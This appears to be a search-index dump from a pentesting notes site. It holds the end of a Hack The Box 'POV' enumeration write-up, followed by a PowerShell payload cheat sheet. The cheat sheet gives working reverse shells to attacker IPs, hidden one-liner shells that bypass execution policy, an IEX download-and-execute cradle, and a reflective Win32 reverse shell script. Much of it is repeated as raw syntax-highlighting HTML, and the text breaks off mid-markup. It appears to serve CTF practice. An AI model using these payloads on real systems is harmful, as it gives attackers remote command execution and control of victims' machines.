http-fileupload-exploiter: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Couldn\u003cspan class=\"s1\"\u003e\u0026#39;t find a file-type field.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s1\"\u003e|_http-csrf: Couldn\u0026#39;\u003c/span\u003et find any CSRF vulnerabilities.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDirectory and file enumeration (Got nothing):\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt:FUZZ -u http://10.10.11.251/FUZZ -recursion -recursion-depth \u003cspan class=\"m\"\u003e1\u003c/span\u003e -e .php,.config,.aspx,asp -v\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSubdomain enumeration(Got nothing) :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u https://FUZZ.pov.htb/\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eVhost enumeration:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003effuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://pov.htb/ -H \u003cspan class=\"s1\"\u003e\u0026#39;Host: dev.pov.htb\u0026#39;\u003c/span\u003e -fs \u003cspan class=\"m\"\u003e1233\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003eGot \u0026quot;dev\u0026quot;\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"POV"},{"content":"\r$socket = new-object System.Net.Sockets.TcpClient(\u0026#39;10.8.3.12\u0026#39;, 4242); if($socket -eq $null){exit 1} $stream = $socket.GetStream(); $writer = new-object System.IO.StreamWriter($stream); $buffer = new-object System.Byte[] 1024; $encoding = new-object System.Text.AsciiEncoding; do { $writer.Flush(); $read = $null; $res = \u0026#34;\u0026#34; while($stream.DataAvailable -or $read -eq $null) { $read = $stream.Read($buffer, 0, 1024) } $out = $encoding.GetString($buffer, 0, $read).Replace(\u0026#34;`r`n\u0026#34;,\u0026#34;\u0026#34;).Replace(\u0026#34;`n\u0026#34;,\u0026#34;\u0026#34;); if(!$out.equals(\u0026#34;exit\u0026#34;)){ $args = \u0026#34;\u0026#34;; if($out.IndexOf(\u0026#39; \u0026#39;) -gt -1){ $args = $out.substring($out.IndexOf(\u0026#39; \u0026#39;)+1); $out = $out.substring(0,$out.IndexOf(\u0026#39; \u0026#39;)); if($args.split(\u0026#39; \u0026#39;).length -gt 1){ $pinfo = New-Object System.Diagnostics.ProcessStartInfo $pinfo.FileName = \u0026#34;cmd.exe\u0026#34; $pinfo.RedirectStandardError = $true $pinfo.RedirectStandardOutput = $true $pinfo.UseShellExecute = $false $pinfo.Arguments = \u0026#34;/c $out $args\u0026#34; $p = New-Object System.Diagnostics.Process $p.StartInfo = $pinfo $p.Start() | Out-Null $p.WaitForExit() $stdout = $p.StandardOutput.ReadToEnd() $stderr = $p.StandardError.ReadToEnd() if ($p.ExitCode -ne 0) { $res = $stderr } else { $res = $stdout } } else{ $res = (\u0026amp;\u0026#34;$out\u0026#34; \u0026#34;$args\u0026#34;) | out-string; } } else{ $res = (\u0026amp;\u0026#34;$out\u0026#34;) | out-string; } if($res -ne $null){ $writer.WriteLine($res) } } }While (!$out.equals(\u0026#34;exit\u0026#34;)) $writer.close(); $socket.close(); $stream.Dispose()\rOne liner shell : powershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.10.10\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\u0026#34;\rOne liner shell : powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\u0026#34;10.10.15.18\u0026#34;,4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2=$sb+\u0026#34;PS \u0026#34;+(pwd).Path+\u0026#34;\u0026gt; \u0026#34;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\rDownload : powershell -c \u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.8.3.12:8080/shell.ps1\u0026#39;)\u0026#34;\r\u0026lt;# DynWin32-ReverseShell.ps1 is a reverse shell based on dynamically looked up Win32 API calls. The script uses reflection to obtain access to GetModuleHandle, GetProcAddress and CreateProcess. Afterwards it uses GetModuleHandle and GetProcAddress to resolve the required WSA functions from ws2_32.dll. This script should be used for educational purposes only (and maybe while playing CTF :D). It was only tested on Windows 10 (x64) and is probably not stable or portable. It\u0026#39;s only purpose is to demonstrate the usage of reflective lookups of Win32 API calls. See it as just a silly experiment :) Author: Tobias Neitzel (@qtc_de) License: GPL-3.0 License #\u0026gt; $IP = \u0026#34;10.8.3.12\u0026#34; $PORT = 4242 filter Get-Type ([string]$dllName,[string]$typeName) { if( $_.GlobalAssemblyCache -And $_.Location.Split(\u0026#39;\\\\\u0026#39;)[-1].Equals($dllName) ) { $_.GetType($typeName) } } function Get-Function { Param( [string] $module, [string] $function ) if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) ) { throw \u0026#34;Error: GetModuleHandle and GetProcAddress must be initialized first!\u0026#34; } $moduleHandle = $GetModuleHandle.Invoke($null, @($module)) $GetProcAddress.Invoke($null, @($moduleHandle, $function)) } function Get-Delegate { Param ( [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, [Parameter(Position = 2)] [Type] $retType = [Void] ) $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(\u0026#39;QD\u0026#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run). DefineDynamicModule(\u0026#39;QM\u0026#39;, $false). DefineType(\u0026#39;QT\u0026#39;, \u0026#39;Class, Public, Sealed, AnsiClass, AutoClass\u0026#39;, [System.MulticastDelegate]) $type.DefineConstructor(\u0026#39;RTSpecialName, HideBySig, Public\u0026#39;,[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags(\u0026#39;Runtime, Managed\u0026#39;) $type.DefineMethod(\u0026#39;Invoke\u0026#39;, \u0026#39;Public, HideBySig, NewSlot, Virtual\u0026#39;, $retType, $argTypes).SetImplementationFlags(\u0026#39;Runtime, Managed\u0026#39;) $delegate = $type.CreateType() [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate) } # Obtain the required types from the already loaded System.dll assembly $assemblies = [AppDomain]::CurrentDomain.GetAssemblies() $unsafeMethodsType = $assemblies | Get-Type \u0026#39;System.dll\u0026#39; \u0026#39;Microsoft.Win32.UnsafeNativeMethods\u0026#39; $nativeMethodsType = $assemblies | Get-Type \u0026#39;System.dll\u0026#39; \u0026#39;Microsoft.Win32.NativeMethods\u0026#39; $startupInformationType = $assemblies | Get-Type \u0026#39;System.dll\u0026#39; \u0026#39;Microsoft.Win32.NativeMethods+STARTUPINFO\u0026#39; $processInformationType = $assemblies | Get-Type \u0026#39;System.dll\u0026#39; \u0026#39;Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION\u0026#39; # Obtain the methods: GetModuleHandle, GetProcAddress and CreateProcess $GetModuleHandle = $unsafeMethodsType.GetMethod(\u0026#39;GetModuleHandle\u0026#39;) $GetProcAddress = $unsafeMethodsType.GetMethod(\u0026#39;GetProcAddress\u0026#39;, [reflection.bindingflags]\u0026#39;Public,Static\u0026#39;, $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null); $CreateProcess = $nativeMethodsType.GetMethod(\u0026#34;CreateProcess\u0026#34;) # Dynamically lookup the required WSA function addresses from ws2_23.dll $ConnectAddr = Get-Function \u0026#34;ws2_32.dll\u0026#34; \u0026#34;connect\u0026#34; $WSASocketAddr = Get-Function \u0026#34;ws2_32.dll\u0026#34; \u0026#34;WSASocketA\u0026#34; $WSAStartupAddr = Get-Function \u0026#34;ws2_32.dll\u0026#34; \u0026#34;WSAStartup\u0026#34; $CloseSocketAddr = Get-Function \u0026#34;ws2_32.dll\u0026#34; \u0026#34;closesocket\u0026#34; # Create delegate types for the dynamically looked up WSA function addresses $CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int]) $WSAStartup = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int]) $Connect = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int]) $WSASocket = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr]) # Call WSAStartup to initialize WSA and create a WSA socket $WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x200)) $hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0) # Prepare the sockaddr_in structure in form of a byte array and use it to connect to the target [Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToUInt32([ipaddress]::Parse($IP).Address)) [Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToUInt16($PORT)) [Array]::Reverse($port) [Byte[]] $buffer = 0x02, 0x00 + $port + $ip + 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 $Connect.Invoke($hSock, $buffer, $buffer.Length) # Create instances of the STARTUP_INFORMATION and PROCESS_INFORMATION structures $startupInformation = $startupInformationType.GetConstructors().Invoke($null) $processInformation = $processInformationType.GetConstructors().Invoke($null) # Redirect stdin, stdout and stderr to the socket within of STARTUP_INFORMATION $safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true) $startupInformation.dwFlags = 0x00000100 $startupInformation.hStdInput = $safeHandle $startupInformation.hStdOutput = $safeHandle $startupInformation.hStdError = $safeHandle # Create a new cmd.exe process with redirected output as specified above $cmd = [System.Text.StringBuilder]::new(\u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34;) $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation)) # Finally close the socket handle that is owned by the script $CloseSocket.Invoke($hSock)\r","date":"2023-09-07","id":89,"permalink":"/notes/shell-and-payload/powershell/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-powershell\" data-lang=\"powershell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$socket\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003enew-object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eNet\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eSockets\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eTcpClient\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;10.8.3.12\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e4242\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$socket\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\u003cspan class=\"n\"\u003eexit\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$socket\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetStream\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$writer\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003enew-object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eIO\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eStreamWriter\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003enew-object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eByte\u003c/span\u003e\u003cspan class=\"p\"\u003e[]\u003c/span\u003e \u003cspan class=\"mf\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$encoding\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003enew-object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eText\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eAsciiEncoding\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$writer\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eFlush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$read\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDataAvailable\u003c/span\u003e \u003cspan class=\"o\"\u003e-or\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read\u003c/span\u003e \u003cspan class=\"o\"\u003e-eq\u003c/span\u003e \u003cspan class=\"vm\"\u003e$null\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003e$read\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$stream\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eRead\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e1024\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eGetString\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$buffer\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eReplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e`r`n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003eReplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"se\"\u003e`n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eequals\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;exit\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eIndexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-gt\u003c/span\u003e \u003cspan class=\"mf\"\u003e-1\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003esubstring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eIndexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"mf\"\u003e+1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003esubstring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mf\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$out\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eIndexOf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"py\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e-gt\u003c/span\u003e \u003cspan class=\"mf\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eNew-Object\u003c/span\u003e \u003cspan class=\"n\"\u003eSystem\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eDiagnostics\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eProcessStartInfo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eFileName\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cmd.exe\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eRedirectStandardError\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan class=\"vm\"\u003e$true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003e$pinfo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"py\"\u003eRedirectStandardOutput\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u003c/span\u003e \u003cspan 